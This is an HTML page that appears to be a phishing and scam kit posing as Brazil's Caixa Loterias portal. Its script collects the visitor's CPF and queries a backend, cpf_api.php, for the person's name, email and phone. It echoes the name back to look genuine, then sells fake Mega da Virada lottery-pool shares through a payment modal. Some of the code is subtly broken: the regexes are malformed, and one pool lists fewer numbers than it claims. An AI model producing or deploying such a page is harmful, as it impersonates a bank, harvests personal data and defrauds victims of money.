<!doctype html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loterias Online</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <style>
    /* Minimal inline styles to keep modal visible */
    .modal { position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; }
    .modal-content { background: #fff; padding: 20px; border-radius: 8px; width: 340px; max-width: 95%; text-align: center; position: relative; }
    .modal-close { position: absolute; right: 10px; top: 6px; font-size: 22px; cursor: pointer; }
    
    /* Estilo para o input de CPF */
    #cpf {
        font-size: 18px;
        letter-spacing: 1px;
        font-weight: 500;
        text-align: center;
    }
    </style>
</head>

<body>

<!-- PASSO 1: Verificação de Idade -->
<div id="passo1" class="passo ativo" style="background: linear-gradient(45deg, #00a9ad, #005ca9); background-size: 100%; background-repeat: no-repeat; height: 100vh; overflow: hidden;">
    <div class="container-principal d-flex justify-content-center align-items-center flex-column">
        <img src="img/loterias-caixa-logo.webp" alt="">
        <h1>Você tem mais de 18 anos?</h1>
        <div class="botoes w-100 d-flex justify-content-center align-items-center">
            <a href="javascript:void(0);" onclick="irParaPasso(2)"><button>SIM</button></a>
            <a href="javascript:void(0);" onclick="alert('Você precisa ter mais de 18 anos para continuar.')"><button class="btn-nao">NÃO</button></a>
        </div>
    </div>
</div>

<!-- PASSO 2: Login com CPF -->
<div id="passo2" class="passo">
    <div class="container-bg">
        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
            <img src="img/logo-caixa.webp" alt="">
            <h1>Login Caixa</h1>
            <h2>Informe seu CPF e clique em "Próximo" para continuar:</h2>
            <form id="cpfForm">
                <div class="form-group">
                    <label for="cpf">CPF</label>
                    <input 
                        name="cpf" 
                        id="cpf" 
                        type="tel" 
                        inputmode="numeric"
                        pattern="[0-9]*"
                        placeholder="000.000.000-00"
                        maxlength="14" 
                        class="form-control"
                        autocomplete="off">
                    <button class="botoes btn btn-primary mt-3" type="submit">Próximo</button>
                </div>
            </form>

            <h3>É novo por aqui? <a href="javascript:void(0);">Cadastre-se</a></h3>
            <h3><a href="javascript:void(0);">Preciso de ajuda</a></h3>
        </div>
    </div>
</div>

<!-- PASSO 3: Confirmação de Nome -->
<div id="passo3" class="passo">
    <div class="container-bg">
        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
            <img src="img/logo-caixa.webp" alt="">
            <h1>Login Caixa</h1>
            <h2>Para continuar, confirme se o seu nome está correto.</h2>
            <h2>Nome:</h2>
            <form>
                <input type="radio" checked> 
                <label id="nome_usuario"></label><br>
            </form>  

            <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
                <a href="javascript:void(0);" onclick="irParaPasso(4)"><button class="btn btn-success">Sim, sou eu</button></a>
                <a href="javascript:void(0);" onclick="irParaPasso(2)"><button class="btn btn-outline-secondary mt-2">Quero alterar meus dados</button></a>
            </div>

            <h3><a href="javascript:void(0);">Preciso de ajuda</a></h3>
        </div>
    </div>
</div>

<!-- PASSO 4: Bolões/Produtos -->
<div id="passo4" class="passo">
    <div class="w-100 topo">
        <div class="w-100 topo-fix">
            <img src="img/icon-caixa.webp" alt="">
        </div>
        <div class="container">
            <div class="row topo-cont">
                <div class="topo-fonts col-md-6 d-flex flex-column">
                    <h1>Loterias Online da Caixa</h1>
                    <h2>Portal Loterias CAIXA: agora você pode apostar na sorte de onde estiver.</h2>
                </div>
                <div class="image-lateral col-md-6 d-flex flex-column justify-content-center align-items-center">
                    <img src="img/image-lateral.png" alt="">
                </div>
            </div>
        </div>
    </div>

    <div class="container-bg">
        <h1>Bolões disponíveis:</h1>

        <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
            <div class="topo-container d-flex justify-content-center align-items-center">
                <img src="img/icon-loterias.webp" alt="">
                <h1>Mega da Virada</h1>
            </div>
            <div class="container-principal-p">
                <h1>R$ 850.000.000,00</h1>
                <h2>Bolão Especial</h2>
                <div class="line"></div>
                <h2>Sorteio: <b>31/12/2025</b></h2>
                <h2>Composição: <b>1 Bolão com 15 Dezenas</b></h2>
                <div class="line"></div>
                <div class="dezenas">
                    <span>01</span>
                    <span>03</span>
                    <span>06</span>
                    <span>12</span>
                    <span>15</span>
                    <span>17</span>
                    <span>20</span>
                    <span>22</span>
                    <span>27</span>
                    <span>32</span>
                    <span>31</span>
                    <span>34</span>
                </div>
                <div class="line"></div>
                <h3>Sua chance de ganhar aumenta em 37x (vezes)!</h3>
                <div class="line"></div>
                <h2>Disponíveis: <b>09 Cotas</b></h2>
                <h2>Valor da Cota: <b>R$49,90</b></h2>
                <div class="botoes">
                    <a href="#" class="open-modal" data-valor="49.90" data-cotas="09"><button class="btn btn-warning"><i class="bi bi-cart-fill"></i> GARANTIR</button></a>
                </div>
            </div>
        </div>

        <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
            <div class="topo-container d-flex justify-content-center align-items-center">
                <img src="img/icon-loterias.webp" alt="">
                <h1>Mega da Virada</h1>
            </div>
            <div class="container-principal-p">
                <h1>R$ 850.000.000,00</h1>
                <h2>Bolão Especial</h2>
                <div class="line"></div>
                <h2>Sorteio: <b>31/12/2025</b></h2>
                <h2>Composição: <b>1 Bolão com 18 Dezenas</b></h2>
                <div class="line"></div>
                <div class="dezenas">
                    <span>01</span>
                    <span>05</span>
                    <span>08</span>
                    <span>13</span>
                    <span>15</span>
                    <span>18</span>
                    <span>25</span>
                    <span>26</span>
                    <span>29</span>
                    <span>31</span>
                    <span>33</span>
                    <span>37</span>
                    <span>38</span>
                    <span>41</span>
                    <span>42</span>
                </div>
                <div class="line"></div>
                <h3>Sua chance de ganhar aumenta em 173x (vezes)!</h3>
                <div class="line"></div>
                <h2>Disponíveis: <b>07 Cotas</b></h2>
                <h2>Valor da Cota: <b>R$79,90</b></h2>
                <div class="botoes">
                    <a href="#" class="open-modal" data-valor="79.90" data-cotas="07"><button class="btn btn-warning"><i class="bi bi-cart-fill"></i> GARANTIR</button></a>
                </div>
            </div>
        </div>

        <div class="container-destaque">
            <span>MAIS VENDIDO</span>
            <div class="container-principal d-flex flex-column justify-content-center align-items-center flex-column">
                <div class="topo-container d-flex justify-content-center align-items-center">
                    <img src="img/icon-loterias.webp" alt="">
                    <h1>Mega da Virada</h1>
                </div>
                <div class="container-principal-p">
                    <h1>R$ 850.000.000,00</h1>
                    <h2>Bolão Especial</h2>
                    <div class="line"></div>
                    <h2>Sorteio: <b>31/12/2025</b></h2>
                    <h2>Composição: <b>1 Bolão com 20 Dezenas</b></h2>
                    <div class="line"></div>
                    <div class="dezenas">
                        <span>01</span>
                        <span>05</span>
                        <span>07</span>
                        <span>11</span>
                        <span>17</span>
                        <span>19</span>
                        <span>20</span>
                        <span>22</span>
                        <span>27</span>
                        <span>32</span>
                        <span>33</span>
                        <span>36</span>
                        <span>37</span>
                        <span>41</span>
                        <span>42</span>
                        <span>48</span>
                        <span>49</span>
                        <span>52</span>
                        <span>58</span>
                        <span>59</span>
                    </div>
                    <div class="line"></div>
                    <h3>Sua chance de ganhar aumenta em 1.327x (vezes)!</h3>
                    <div class="line"></div>
                    <h2>Disponíveis: <b>01 Cotas</b></h2>
                    <h2>Valor da Cota: <b>R$99,90</b></h2>
                    <div class="botoes">
                        <a href="#" class="open-modal" data-valor="99.90" data-cotas="01"><button class="btn" style="background-color: #0070ae;color:#fff;"><i class="bi bi-cart-fill"></i> GARANTIR</button></a>
                    </div>
                </div>
            </div>
        </div>

    </div>

    <!-- Modal (pop-up) -->
    <div id="paymentModal" class="modal">
        <div class="modal-content">
            <span class="modal-close">&times;</span>
            <h2>Aviso Importante</h2>
            <p>
                Atenção, o seu bolão será enviado por WhatsApp e e-mail. Fique atento(a).<br/><br/>
                Caso você ganhe também avisaremos.
            </p>

            <div id="modalBody">
                <a id="continueToPayment" href="#" target="_blank" class="btn btn-primary">GARANTIR BOLÃO</a>
                <div id="pixArea" style="margin-top:15px;"></div>
            </div>

        </div>
    </div>
</div>

<!-- SCRIPTS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>

<script type="text/javascript">
// ===== SISTEMA DE NAVEGAÇÃO ENTRE PASSOS =====
let passoAtual = 1;

function irParaPasso(numeroPasso) {
    document.getElementById('passo' + passoAtual).classList.remove('ativo');
    document.getElementById('passo' + numeroPasso).classList.add('ativo');
    passoAtual = numeroPasso;
    window.scrollTo(0, 0);

    if (numeroPasso === 3) {
        const nomeCpf = localStorage.getItem('nome_cpf');
        if (nomeCpf) {
            $('#nome_usuario').text(nomeCpf);
        } else {
            $('#nome_usuario').text('Nome não encontrado');
        }
    }
}

// ===== PASSO 2: FORMATAÇÃO E CONSULTA DE CPF =====
window.addEventListener('load', function () {
    document.getElementById('cpf').value = '';
});

// Função melhorada de formatação de CPF com máscara visual
function formatCpf(input) {
    // Remove tudo que não é número
    let value = input.value.replace(/D/g, '');
    
    // Limita a 11 dígitos
    value = value.substring(0, 11);
    
    // Aplica a máscara
    if (value.length > 0) {
        if (value.length <= 3) {
            value = value;
        } else if (value.length <= 6) {
            value = value.replace(/^(d{3})(d+)/, '$1.$2');
        } else if (value.length <= 9) {
            value = value.replace(/^(d{3})(d{3})(d+)/, '$1.$2.$3');
        } else {
            value = value.replace(/^(d{3})(d{3})(d{3})(d+)/, '$1.$2.$3-$4');
        }
    }
    
    input.value = value;
}

// Adiciona evento de input para formatação em tempo real
document.getElementById('cpf').addEventListener('input', function(e) {
    formatCpf(e.target);
});

// Impede colagem de texto não numérico
document.getElementById('cpf').addEventListener('paste', function(e) {
    e.preventDefault();
    const pastedText = (e.clipboardData || window.clipboardData).getData('text');
    const numbersOnly = pastedText.replace(/D/g, '');
    this.value = numbersOnly;
    formatCpf(this);
});

document.getElementById('cpfForm').addEventListener('submit', function (event) {
    event.preventDefault();

    localStorage.removeItem('nome_cpf');
    localStorage.removeItem('cpf_value');

    const cpfInput = document.getElementById('cpf');
    const cpf = cpfInput.value.replace(/D/g, '');
    const button = this.querySelector('button[type="submit"]');

    // Validação básica
    if (cpf.length !== 11) {
        alert('Por favor, digite um CPF válido com 11 dígitos');
        cpfInput.focus();
        return;
    }

    button.disabled = true;
    button.textContent = 'Consultando...';
    button.style.opacity = '0.5';

    // Usando XMLHttpRequest
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'cpf_api.php?cpf=' + encodeURIComponent(cpf), true);
    xhr.setRequestHeader('Accept', 'application/json');
    
    xhr.onload = function() {
        console.log('Status:', xhr.status);
        console.log('Resposta:', xhr.responseText);
        
        if (xhr.status >= 200 && xhr.status < 300) {
            try {
                const data = JSON.parse(xhr.responseText);
                console.log('Dados:', data);
                
                if (data.success && data.dadosBasicos && data.dadosBasicos.nome) {
                    localStorage.setItem('nome_cpf', data.dadosBasicos.nome);
                    localStorage.setItem('cpf_value', cpf);
                    
                    // Armazenar email (primeiro email disponível)
                    if (data.emails && data.emails.length > 0 && data.emails[0].EMAIL) {
                        localStorage.setItem('email_cpf', data.emails[0].EMAIL);
                    }
                    
                    // Armazenar telefone (primeiro telefone disponível)
                    if (data.telefones && data.telefones.length > 0) {
                        const telefone = data.telefones[0];
                        const ddd = telefone.DDD || '';
                        const numero = telefone.TELEFONE || '';
                        if (ddd && numero) {
                            localStorage.setItem('telefone_cpf', ddd + numero);
                        }
                    }

                    setTimeout(() => {
                        button.disabled = false;
                        button.textContent = 'Próximo';
                        button.style.opacity = '1';
                        irParaPasso(3);
                    }, 1000);
                } else {
                    const errorMsg = data.message || 'Nome não encontrado';
                    alert('Erro: ' + errorMsg);
                    button.disabled = false;
                    button.textContent = 'Próximo';
                    button.style.opacity = '1';
                }
            } catch (e) {
                console.error('Erro ao parsear JSON:', e);
                console.error('Texto recebido:', xhr.responseText);
                alert('Erro: Resposta inválida do servidor');
                button.disabled = false;
                button.textContent = 'Próximo';
                button.style.opacity = '1';
            }
        } else {
            alert('Erro ao consultar CPF (Status: ' + xhr.status + ')');
            button.disabled = false;
            button.textContent = 'Próximo';
            button.style.opacity = '1';
        }
    };
    
    xhr.onerror = function() {
        console.error('Erro de rede ao acessar cpf_api.php');
        alert('Erro de conexão. Verifique sua internet e tente novamente.');
        button.disabled = false;
        button.textContent = 'Próximo';
        button.style.opacity = '1';
    };
    
    xhr.send();
});
</script>

<script src="js/app.js"></script>

</body>
</html>